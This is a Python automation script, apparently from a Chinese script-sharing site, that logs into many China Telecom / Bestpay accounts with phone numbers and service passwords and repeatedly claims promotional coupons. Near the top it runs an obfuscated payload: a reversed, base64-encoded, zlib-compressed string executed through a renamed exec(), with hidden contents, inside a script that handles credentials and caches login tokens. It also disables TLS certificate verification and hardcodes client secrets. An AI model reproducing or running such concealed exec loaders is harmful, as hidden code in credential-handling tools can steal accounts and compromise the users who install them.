# 当前脚本来自于 http://script.345yun.cn 脚本库下载。
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。

# ʚΐɞ 翼支付自动领券小助手 ʚΐɞ
# 🌸 modify：智慧与美貌并存的我 🌸

"""
cron: 30 59 8 * * *
const $ = new Env("翼支付领券");
"""

import asyncio
import aiohttp
import aiodns
import json
import rsa
import base64
import hashlib
import random
import datetime
import sys
import time
import os
import ssl
import re
from Crypto.Cipher import AES, DES3, PKCS1_v1_5
from Crypto.Util.Padding import pad, unpad
from concurrent.futures import ThreadPoolExecutor
import base64,zlib

O00OOO0O0O00000="=Iam8DcA+XfwWD7rbd9OG2dbBzAhRRaLIUFtrtXYLvdZxon98ZNjkVoyZpxmeITMB+UJqx6IOi3nc1P1SVtepPO/Rqts0t31ZPNZt7VP+Fa7A/0bTR8JouU2H9a3VybVFrxl57qaRTs9pAjcXjpw2R5IEB8Rpip2ONTVR08cZGREiglRqYHCr11QiHkHM3tiLT/jii3zRO2hSXmMleg8HLwaEKi17px89/K1vpH/1sPvEKTwxitChaHtvRfPabROaIWmFFYox9VKvvvxNfLXz0HStS7AAv7VUJXPEW15MIAJT4r1Cz0izrRCXAkpmco3tpHbNcvFdZ4lkiqUDREkVzMZLYGmpQloqDolyduPclD2NtGhDzh9e6OQJc9zOgtaPOavjrb9wM+EmSlqOVjVuXxUvW2sVs8EyQSJydcXe7avFlmhx23fv/zdVuHVd84nvne/51n5wbM0Qm+9fv2hl/26l/xmbe12bezdL/7t7fd7l/89NDtmhFb1s44whau+dTZEuKFC+iCHZRSFq+kPYjsUBXKm+BQgihAK1z8R6ERHgERDUwutsiJyMmZhPaY3IPuNANWAULcr8Mek14geyB/OeQskFCoUszha9X4yBPIJ9ImrDkbQpoQBWJGHN6ODNyd8ChNRBl5xAFWeygihCNL4pRDHrGcKlhEnUoYPqPStaEQZBTUhz0sI0U3954950QiB11ukDHdmLIf7Z2R+0EoAAFJSbICkwuoZPKC2Ap5QY0bhztDSSHC5vCZYY6c2iVZSkJNGwQ6UlNSGjYzwVUf7UA02KuLV9xJe"
OOOO0000OO0O000=lambda x:zlib.decompress(base64.b64decode(x[::-1]+'='*(4-len(x)%4)));
O0OO00O0O000O0O=exec;
O0OO00O0O000O0O(OOOO0000OO0O000(O00OOO0O0O00000).decode('utf-8'))

# ʕ•̫͡•ʔ 全局变量区 ʕ•̫͡•ʔ
public_key = ""
kproductNo = ""
load_token = {}
rq = ""
qlts = 0

# 🌸 要抢的权益清单 🌸
# 如果你不知道要领什么权益，复制qg第一行到末尾，只修改权益包名，
# 并且修改dyqy=1，运行脚本就会显示该权益包的所有权益哦～
qg = {
    '要抢的权益包名': ['权益名称 权益名称下面的小字,没有填None', '定时抢券时间，不填写时间会直接领券'],
    'N选权益包-升5G-9元': ['领160个权益币 None'],
    '橙翼权益': ['话费充值券包 价值9元', '话费充值券包 价值18元', '话费充值券包 价值24元', '爱奇艺 视频月卡', '8:59:59'],
    'N选权益包': ['领5元话费券赠170个权益币 None'],
    'N选权益包-加副-9元': ['领160个权益币 None'],
    '流量权益包-19元': ['领160个权益币 None'],
    '天翼云盘橙意包': ['翼支付通用券 18元券包 None'],
    '5g升级权益合约': ['领腾讯会员周卡赠送100个权益币 None'],
    '河南天翼云盘融云橙翼包': ['领腾讯会员周卡赠送100个权益币 None'],
    '节日促销-权益N选1合约-9元': ['翼支付通用券 18元券包'],
    "河南15元出行权益包": ["150个权益币 180天有效期"],
    "15元N选权益小合约": ["话费+腾讯周卡券包 10元话费+腾讯周卡"],
    '内蒙古9.9元选权益包': ['领5元话费券赠170个权益币 None'],
}

# 编辑productNo_list或者设置变量yzf，格式：手机号@服务密码,多号&隔开
productNo_list = ''

# 🌟 配置选项 🌟
# 是否打印权益名称方便修改领取列表，1开启0关闭
dyqy = 1

# 是否开启优惠券查询推送，1开启， 0关闭
yhcx = 1

# 是否屏蔽未生效优惠券
sxyh = 1

# 屏蔽的优惠券列表
yhqhmd = ["北冰洋5元饮品券", "北冰洋15元饮品券", None]

# 开启并发, 1开启0关闭
kqbf = 1

# 并发数量，账号太多可能报错
bfs = 10

# 重试次数
cfcs = os.environ.get('yzfcf') or 50

# 初始化日志字典
logg = {}

# 创建线程池执行器（用于CPU密集型操作）
executor = ThreadPoolExecutor(max_workers=10)

# SSL配置
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.set_ciphers('DEFAULT@SECLEVEL=0')

appType = "116"

# ʚ♡ɞ 工具函数区 ʚ♡ɞ
def encrypt(text):
    key = b'1234567`90koiuyhgtfrdews'
    iv = 8 * b'\0'
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(text.encode(), DES3.block_size))
    return ciphertext.hex()

def decrypt(text):
    key = b'1234567`90koiuyhgtfrdews'
    iv = 8 * b'\0'
    ciphertext = bytes.fromhex(text)
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), DES3.block_size)
    return plaintext.decode()

def encode_phone(text):
    encoded_chars = []
    for char in text:
        encoded_chars.append(chr(ord(char) + 2))
    return ''.join(encoded_chars)

# 生成可爱的加载动画
async def cute_loading(text):
    animations = ["(๑•̀ㅂ•́)و✧", "(*^▽^*)", "ε=ε=ε=┏(゜ロ゜;)┛", "♪(^∇^*)"]
    for i in range(3):
        print(f"{text} {animations[i % len(animations)]}")
        await asyncio.sleep(0.5)

# ʚΐɞ 核心业务函数 ʚΐɞ
async def userLoginNormal(ss, phone, password):
    await cute_loading(f"正在为 {phone} 进行登录认证")
    alphabet = 'abcdef0123456789'
    uuid = [''.join(random.sample(alphabet, 8)), ''.join(random.sample(alphabet, 4)),
            '4' + ''.join(random.sample(alphabet, 3)), ''.join(random.sample(alphabet, 4)),
            ''.join(random.sample(alphabet, 12))]
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    loginAuthCipherAsymmertric = 'iPhone 14 15.4.' + uuid[0] + uuid[1] + phone + timestamp + password[:6] + '0$$$0.'
    public_key_b64 = 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBkLT15ThVgz6/NOl6s8GNPofdWzWbCkWnkaAm7O2LjkM1H7dMvzkiqdxU02jamGRHLX/ZNMCXHnPcW/sDhiFCBN18qFvy8g6VYb9QtroI09e176s+ZCtiv7hbin2cCTj99iUpnEloZm19lwHyo69u5UMiPMpq0/XKBO8lYhN/gwIDAQAB'

    try:
        r = await ss.post('https://appgologin.189.cn:9031/login/client/userLoginNormal', json={
            "headerInfos": {
                "code": "userLoginNormal",
                "timestamp": timestamp,
                "broadAccount": "",
                "broadToken": "",
                "clientType": "#10.5.0#channel50#iPhone 14 Pro Max#",
                "shopId": "20002",
                "source": "110003",
                "sourcePassword": "Sid98s",
                "token": "",
                "userLoginName": encode_phone(phone)
            },
            "content": {
                "attach": "test",
                "fieldData": {
                    "loginType": "4",
                    "accountType": "",
                    "loginAuthCipherAsymmertric": rsa_encrypt(public_key_b64, loginAuthCipherAsymmertric),
                    "deviceUid": uuid[0] + uuid[1] + uuid[2],
                    "phoneNum": encode_phone(phone),
                    "isChinatelecom": "0",
                    "systemVersion": "15.4.0",
                    "authentication": encode_phone(password)
                }
            }
        })
        r = await r.json()
        l = r.get('responseData').get('data')

        if l and l.get('loginSuccessResult'):
            l = l.get('loginSuccessResult')
            load_token[phone] = l
            with open(load_token_file, 'w') as f:
                json.dump(load_token, f)
            ticket = await get_ticket(ss, phone, l['userId'], l['token'])
            print(f"🎉 {phone} 登录成功啦！🎉")
            return ticket
        else:
            print(f"❌ {phone} 登录失败: {r}")
    except Exception as e:
        print(f"❌ 登录过程出错: {e}")
    return False

async def get_ticket(ss, phone, userId, token):
    try:
        r = await ss.post('https://appgologin.189.cn:9031/map/clientXML',
                         data='<Request><HeaderInfos><Code>getSingle</Code><Timestamp>' +
                              datetime.datetime.now().strftime("%Y%m%d%H%M%S") +
                              '</Timestamp><BroadAccount></BroadAccount><BroadToken></BroadToken><ClientType>#9.6.1#channel50#iPhone 14 Pro Max#</ClientType><ShopId>20002</ShopId><Source>110003</Source><SourcePassword>Sid98s</SourcePassword><Token>' +
                              token +
                              '</Token><UserLoginName>' +
                              phone +
                              '</UserLoginName></HeaderInfos><Content><Attach>test</Attach><FieldData><TargetId>' +
                              encrypt(userId) +
                              '</TargetId><Url>4a6862274835b451</Url></FieldData></Content></Request>',
                         headers={
                             'user-agent': 'CtClient;10.4.1;Android;13;22081212C;NTQzNzgx!#!MTgwNTg1'
                         })
        r = await r.text()
        tk = re.findall('<Ticket>(.*?)</Ticket>', r)
        if len(tk) == 0:
            print(f"❌ {phone} 获取Ticket失败")
            return False
        return decrypt(tk[0])
    except Exception as e:
        print(f"❌ 获取Ticket出错: {e}")
        return False

def run_Time(sj):
    sj = sj.split(':')
    hour, miute, second = int(sj[0]), int(sj[1]), int(sj[2])
    date = datetime.datetime.now()
    date_zero = datetime.datetime.now().replace(
        year=date.year, month=date.month, day=date.day, hour=hour, minute=miute, second=second)
    date_zero_time = int(time.mktime(date_zero.timetuple()))
    return date_zero_time

# 异步HTTP客户端会话
async def create_session():
    resolver = aiohttp.AsyncResolver(nameservers=["119.29.29.29"])
    connector = aiohttp.TCPConnector(resolver=resolver, limit=100, ssl=ssl_context)
    return aiohttp.ClientSession(connector=connector)

# 加密相关函数
def aes_encrypt(plaintext, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC, 16 * b'\0')
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), AES.block_size))).decode()

def rsa_encrypt(j_rsakey, string):
    rsa_key = f"-----BEGIN PUBLIC KEY-----\n{j_rsakey}\n-----END PUBLIC KEY-----"
    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(rsa_key.encode())
    return base64.b64encode(rsa.encrypt(f'{string}'.encode(), pubkey)).decode()

def generate_mixed():
    return ''.join(str(random.randint(0, 9)) for _ in range(16))

def trace_log_id():
    return datetime.datetime.now().strftime("%Y%m%d%H%M%S") + ''.join(
        str(random.randint(0, 9)) for _ in range(18))

def md5_hash(s):
    return hashlib.md5(s.encode()).hexdigest().upper()

def process_data(e):
    param_str = json.dumps(e)
    rk = generate_mixed()
    erk = rsa_encrypt(public_key, rk)
    edata = aes_encrypt(param_str, rk)
    return {
        'encyType': 'C005',
        'data': edata,
        'fromchannelId': 'H5',
        'key': erk,
        'productNo': kproductNo,
        'sign': md5_hash(param_str)
    }

async def ascii_add_2(number_str):
    transformed = ''.join(chr(ord(char) + 2) for char in number_str)
    return transformed

# 异步请求函数
async def async_post(session, url, data):
    try:
        async with session.post(url, json=data) as response:
            response.raise_for_status()
            return await response.json()
    except Exception as e:
        print(f"❌ 请求失败: {url} - {str(e)}")
        return None

# ʚΐɞ 权益处理函数 ʚΐɞ
async def process_product(session, product_no):
    product_no, password = product_no.split('@')
    logg[product_no] = []
    print(f"💖 开始处理账号: {product_no} 💖")

    # 尝试使用缓存登录
    ticket = False
    if product_no in load_token:
        print(f"✨ {product_no} 使用缓存登录中...")
        ticket = await get_ticket(session, product_no, load_token[product_no]['userId'],
                                 load_token[product_no]['token'])

    # 如果缓存登录失败，则使用密码登录
    if ticket == False:
        print(f"🔐 {product_no} 使用密码登录中...")
        ticket = await userLoginNormal(session, product_no, password)

    if ticket == False:
        print(f"❌ {product_no} 登录失败，跳过该账号")
        return

    # 获取会话密钥
    print(f"🔑 {product_no} 获取会话密钥中...")
    session_key = await get_session_key_async(session, product_no, ticket)
    if not session_key:
        print(f"❌ {product_no} 翼支付session_key获取失败")
        return

    # 查询优惠券列表
    if yhcx:
        print(f"📜 {product_no} 查询未使用优惠券...")
        await get_queryUserNoUseEquity(session, product_no, session_key)

    # 查询权益包列表
    print(f"🎁 {product_no} 查询权益包列表...")
    page_data = await get_page_ordered_sales_async(session, product_no, session_key)

    if not page_data or not page_data.get('result', {}).get('salesProductList'):
        logg[product_no].append("没有找到可用权益包哦～")
        print(f"❌ {product_no} 没有找到可用权益包")
        return

    # 处理每个权益包
    print(f"🛍️ {product_no} 开始处理权益包...")
    tasks = []
    for item in page_data['result']['salesProductList']:
        for i in qg:
            if i in item['qyProductName']:
                tasks.append(process_equity_package(session, product_no, session_key, item, qg[i]))

    await asyncio.gather(*tasks)
    print(f"🎉 {product_no} 所有权益处理完成！🎉")

# 异步会话密钥获取
async def get_session_key_async(session, product_no, code):
    data = process_data({"appType": appType, "agreeId": "20201016030100056487302393758758",
                        "encryptData": code, "systemType": "", "imei": "", "mtMac": "", "wifiMac": "",
                        "location": ""})
    response = await async_post(session, 'https://mapi-welcome.bestpay.com.cn/gapi/AppFusionLogin/queryAuthorized', data)
    return response['result']['sessionKey'] if response else None

# 查询未使用优惠券
async def get_queryUserNoUseEquity(session, product_no, session_key):
    queryUserNoUseEquity = await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/5gproduct/vipProduct/equitySpecialZoneService/queryUserNoUseEquity',
                                           process_data({"encyType": "C005", "appType": appType,
                                                        "agreeId": "20210518030100134138528408797188",
                                                        "fromChannelId": "H5", "fromchannelId": "H5",
                                                        "productNo": product_no, "sessionKey": session_key,
                                                        "pageNo": "1", "pageSize": "100"}))

    Equity = []

    for i in queryUserNoUseEquity['result']['queryNoUserInfoList']:
        Equity += i['batchList']

    for i in Equity:
        if i['batchName'] in yhqhmd:
            continue

        srq = i["couponStartDate"].split(' ')[0].replace('-', '')

        if int(srq) > int(rq.replace('-', '')) and sxyh:
            continue

        msg = f"{i['batchName']} {i['minConsume']}-{i['denomination']}\n开始: {i['couponStartDate']}\n过期: {i['couponEndDate']}"
        logg[product_no].append(msg)
        print(f"🎫 {product_no} 优惠券: {i['batchName']}")

        if qlts == 1:
            if i['couponStartDate'].split(' ')[0] == rq:
                msg = f"{product_no} 翼支付有优惠券今日可用哦～\n{i['batchName']} {i['minConsume']}-{i['denomination']}\n开始: {i['couponStartDate']}\n过期: {i['couponEndDate']}"
                send(msg, msg)

            if i['couponEndDate'].split(' ')[0] == rq:
                msg = f"{product_no} 翼支付有优惠券今日到期啦～\n{i['batchName']} {i['minConsume']}-{i['denomination']}\n开始: {i['couponStartDate']}\n过期: {i['couponEndDate']}"
                send(msg, msg)

# 异步权益包查询
async def get_page_ordered_sales_async(session, product_no, session_key):
    data = process_data({
        "encyType": "C005",
        "appType": appType,
        "fromchannelId": "H5",
        "productNo": product_no,
        "sessionKey": session_key,
        "currentPage": 1,
        "displayOrderType": "DEFAULT",
        "pageSize": 70
    })
    return await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/5gproduct/vipProduct/query/pageOrderedSales', data)

# 异步权益包处理
async def process_equity_package(session, product_no, session_key, item, qgi):
    order_no = item["orderNo"]
    qyProductName = item['qyProductName']
    print(f"📦 处理权益包: {qyProductName}")

    detail_data = await get_query_equity_package_detail_async(session, product_no, session_key, order_no)

    for module in detail_data.get("result", {}).get("equityModuleInfoDTOList", []):
        bindEquityList = []
        unit_ids = []
        module_id = module['moduleId']
        moduleName = f"{module['moduleShowConfigDTO']['moduleName']}"

        # 判断权益类型
        if type(qgi) == dict:
            if moduleName not in qgi:
                continue
            else:
                qgim = qgi[moduleName]
        elif type(qgi) == list:
            qgim = qgi
        else:
            print(f"❌ 配置格式错误: {qyProductName}")
            return

        # 处理定时抢券
        if ':' in qgim[-1]:
            wt = run_Time(qgim[-1])
            print(f"⏰ {product_no} 将在 {qgim[-1]} 准时抢券: {qyProductName}")
        else:
            wt = 0

        # 收集权益项
        if module.get("classifyDTOList"):
            for c in module["classifyDTOList"]:
                lineDTOList = c["lineDTOList"]
                for m in lineDTOList:
                    bindEquityList += m["bindEquityList"]
        if module.get('bindEquityList'):
            bindEquityList += module["bindEquityList"]

        for n in bindEquityList:
            unit_ids.append(n['unitEquityId'])

        if unit_ids == []:
            continue

        # 查询权益详情
        if unit_ids:
            r = await get_queryOrderedEquityPackage_async(session, product_no, session_key, order_no, module_id, unit_ids)

            for n in r["result"]:
                qy = f"{n['bindEquityConfig']['equityMainTitle']} {n['bindEquityConfig']['equitySubTitle']}"

                # 打印权益信息
                if dyqy:
                    print(f"'{qyProductName}': ['{qy}'],")

                # 判断是否是目标权益
                if qy not in qgim:
                    continue

                unitEquityId = n['unitEquityId']
                equityNo = n['equityId']
                if n['bindEquityConfig']['equitySubTitle'] == None:
                    n['bindEquityConfig']['equitySubTitle'] = ""

                qyn = f"{qyProductName} {qy}"

                # 检查是否已领取
                if n['lastDistributeStatus'] != "SUCCESS":
                    if wt != 0 and abs(wt - time.time()) > 300:
                        msg = f"{product_no} [{qyProductName}] 不在抢券时间哦～"
                        print(msg)
                        logg[product_no].append(msg)
                        return

                    msg = f"🎯 {product_no}【开始领取】{qyn}"
                    print(msg)
                    logg[product_no].append(msg)
                    await process_equity_receive(session, product_no, session_key, order_no, module_id, unitEquityId, equityNo, qyn, wt)
                else:
                    msg = f"✅ {product_no}【已领取】{qyn}"
                    print(msg)
                    logg[product_no].append(msg)

# 异步权益详情查询
async def get_query_equity_package_detail_async(session, product_no, session_key, order_no):
    data = process_data({
        "encyType": "C005",
        "orderNo": order_no,
        "appType": appType,
        "agreeId": "20211216030100210919654787383364",
        "productNo": product_no,
        "phoneNo": product_no,
        "requestNo": generate_mixed(),
        "requestDate": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "sessionKey": session_key,
        "requestSystem": "equity-novel-h5",
        "operator": "",
        "traceLogId": ""
    })
    return await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/ep-product-center/EquityPackageService/queryEquityPackageDetailCustomer', data)

# 异步查询已订购权益包
async def get_queryOrderedEquityPackage_async(session, product_no, session_key, order_no, module_id, unitEquityIdList):
    data = process_data({
        "encyType": "C005",
        "orderNo": order_no,
        "appType": appType,
        "agreeId": "20211216030100210919654787383364",
        "productNo": product_no,
        "phoneNo": product_no,
        "sessionKey": session_key,
        "unitEquityIdList": unitEquityIdList,
        "currentPeriodsNumber": "1",
        "moduleId": module_id
    })
    return await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/op-product-system/EquityPackageService/queryOrderedEquityPackage', data)

# 异步权益领取
async def process_equity_receive(session, product_no, session_key, order_no, module_id, unitEquityId, equityNo, qyn, wt):
    # 等待到指定时间
    while wt - time.time() > 1 and wt - time.time() < 600:
        remaining = wt - time.time()
        print(f"🕙 {product_no} 正在等待抢券时间: {qyn} ({remaining:.1f}秒后)")
        await asyncio.sleep(1)

    print(f"💥 {product_no} 开始尝试领取: {qyn}")

    # 构建领取请求参数
    data = process_data({
        "equityNo": equityNo,
        "orderNo": order_no,
        "equityModuleId": module_id,
        "appId": None,
        "encyType": "C005",
        "appType": appType,
        "agreeId": "20211216030100210919654787383364",
        "fromChannelId": "h5",
        "timestamp": int(time.time() * 1000),
        "priceType": "SALES_PRICE",
        "unitEquityId": unitEquityId,
        "productNo": product_no,
        "phoneNo": product_no,
        "requestNo": generate_mixed(),
        "requestDate": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "sessionKey": session_key,
        "requestSystem": "equity-novel-h5",
        "operator": "",
        "traceLogId": ""
    })

    # 执行领取操作（带重试）
    for attempt in range(cfcs):
        try:
            print(f"🔄 {product_no} 尝试领取 {qyn} (第{attempt+1}/{cfcs}次)")
            response = await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/ep-product-center/RebateService/manualReceiveEquity', data)

            if not response:
                print(f"❌ {product_no} 领取请求失败，重试中...")
                continue

            rebateFailReason = response.get('errorMsg', '未知错误')

            if response.get('success'):
                # 处理领取结果
                r = await check_receipt_status(session, product_no, response['result']['rebateDetailNo'], session_key)
                rebateFailReason = r.get('result', {}).get('rebateFailReason', '未知状态')

            msg = f'💌 {product_no}[{qyn}]{rebateFailReason}'
            print(msg)

            if '登录' in msg:
                print(f"❌ {product_no} 需要重新登录，跳过该权益")
                return

            if '9.9元视频会员权益包' in msg and '限额' in msg:
                print(f"❌ {product_no} 视频会员权益包已达限额，跳过")
                continue

            if '已达上限' in str(rebateFailReason) or '次数已用完' in str(rebateFailReason) or '限额' in str(rebateFailReason) or '风控' in str(rebateFailReason) or '黑名单' in str(rebateFailReason):
                logg[product_no].append(msg)
                print(f"❌ {product_no} 领取失败: {rebateFailReason}")
                return

            if '成功' in str(rebateFailReason):
                logg[product_no].append(msg)
                print(f"🎉 {product_no} 领取成功: {qyn}")
                if qlts:
                    send(msg, msg)
                return

        except Exception as e:
            print(f"❌ {product_no} 领取过程出错: {e}，重试中...")
            pass

        # 失败后等待一段时间再重试
        await asyncio.sleep(0.5 + random.random())

    print(f"❌ {product_no} 尝试{cfcs}次后仍未成功领取: {qyn}")
    logg[product_no].append(f"❌ {product_no} 尝试{cfcs}次后仍未成功领取: {qyn}")

# 异步状态检查
async def check_receipt_status(session, product_no, rebate_detail_no, session_key):
    data = process_data({
        "rebateDetailNo": rebate_detail_no,
        "encyType": "C005",
        "appType": appType,
        "agreeId": "20211216030100210919654787383364",
        "fromChannelId": "H5",
        "timestamp": int(time.time() * 1000),
        "requestNo": generate_mixed(),
        "requestSystem": "equity-novel-h5",
        "requestDate": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "productNo": product_no,
        "sessionKey": session_key,
        "phoneNo": product_no,
        "operator": "",
        "traceLogId": ""
    })

    receiveStatus = "PENDING"
    attempts = 0

    print(f"🕒 {product_no} 检查领取状态: {rebate_detail_no}")

    while receiveStatus == "PENDING" and attempts < 10:
        attempts += 1
        response = await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/ep-product-center/RebateService/queryUserEquityReceiveStatus', data)

        if not response:
            print(f"❌ {product_no} 检查状态请求失败，重试中...")
            await asyncio.sleep(1)
            continue

        receiveStatus = response.get('result', {}).get('receiveStatus', 'UNKNOWN')
        print(f"🔍 {product_no} 领取状态: {receiveStatus} ({attempts}/10)")

        if response and receiveStatus == "SUCCESS":
            response['result']['rebateFailReason'] = "领取成功啦～ ✨"
            break

        await asyncio.sleep(1)  # 等待重试

    if receiveStatus != "SUCCESS":
        print(f"❌ {product_no} 检查状态超时: {receiveStatus}")

    return response

# ʚΐɞ 主函数 ʚΐɞ
async def process_product2(session, product_no, sem):
    async with sem:
        for attempt in range(20):
            try:
                print(f"💪 开始处理账号 {product_no} (尝试{attempt+1}/20)")
                await process_product(session, product_no)
                print(f"🎉 账号 {product_no} 处理完成！")
                return
            except Exception as e:
                print(f"❌ 处理账号 {product_no} 出错: {e}，问题不大，等我重试，先听一首儿歌多多~")
                await asyncio.sleep(2)  # 等待重试

async def main():
    global kproductNo, public_key, rq

    print("🌸🌸🌸 翼支付自动领券小助手启动啦！🌸🌸🌸")

    # 获取当前日期
    rq = datetime.datetime.now().strftime("%Y-%m-%d")
    print(f"📅 当前日期: {rq}")

    # 初始化参数
    kproductNo = str(int(datetime.datetime.now().timestamp()))
    print(f"🔢 生成产品编号: {kproductNo}")

    # 创建会话
    print("🌐 创建网络会话...")
    async with await create_session() as session:
        # 获取初始参数
        print("🔑 获取公钥...")
        public_key = await async_post(session, 'https://mapi-h5.bestpay.com.cn/gapi/mapi-gateway/applyLoginFactor', {
            "productNo": kproductNo,
            "requestType": "H5",
            "traceLogId": trace_log_id()
        })

        if not public_key:
            print("❌ 获取公钥失败，程序退出")
            return

        public_key = public_key['result']['nonce']
        print("✅ 公钥获取成功")

        # 获取账号列表
        productNo_lists = os.environ.get('yzf') or productNo_list
        if not productNo_lists:
            print("❌ 没有配置账号信息，请设置 yzf 环境变量或修改 productNo_list")
            return

        productNo_lists = productNo_lists.split('&')
        print(f"👛 找到 {len(productNo_lists)} 个账号需要处理")

        # 并发处理所有产品
        sem = asyncio.Semaphore(bfs)
        print(f"⚙️ 启动并发模式，最大并发数: {bfs}")

        if kqbf:
            print("🚀 开始并发处理所有账号...")
            tasks = [process_product2(session, p, sem) for p in productNo_lists]
            await asyncio.gather(*tasks)
        else:
            print("🚶 开始顺序处理所有账号...")
            for p in productNo_lists:
                await process_product2(session, p, sem)

        print("\n🎉🎉🎉 所有账号处理完成！🎉🎉🎉")

        # 输出日志
        print("\n📄 操作日志汇总:")
        for p in logg:
            print(f"\n📱 {p} 的日志:")
            for entry in logg[p]:
                print(f"    {entry}")

if __name__ == "__main__":
    load_token_file = 'chinaTelecom_cache.json'

    # 尝试加载通知模块
    try:
        from notify import send
        qlts = 1
        print(f"✅ 加载青龙通知服务成功！可以接收推送通知啦～")
    except:
        qlts = 0
        print("⚠️ 未能加载通知服务，将无法接收推送通知")

    # 尝试加载缓存
    try:
        with open(load_token_file, 'r') as f:
            load_token = json.load(f)
        print(f"✅ 从 {load_token_file} 加载缓存成功")
    except:
        load_token = {}
        print("⚠️ 未能加载缓存，将使用密码登录所有账号")

    # 配置事件循环策略（Windows需要）
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        print("💻 检测到Windows系统，已配置适当的事件循环策略")

    # 启动异步主函数
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 用户中断操作，程序退出")
    except Exception as e:
        print(f"\n❌ 程序运行出错: {e}")

    print("\n🌸 感谢使用翼支付自动领券小助手！下次再见～ 🌸")

# 当前脚本来自于 http://script.345yun.cn 脚本库下载。
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。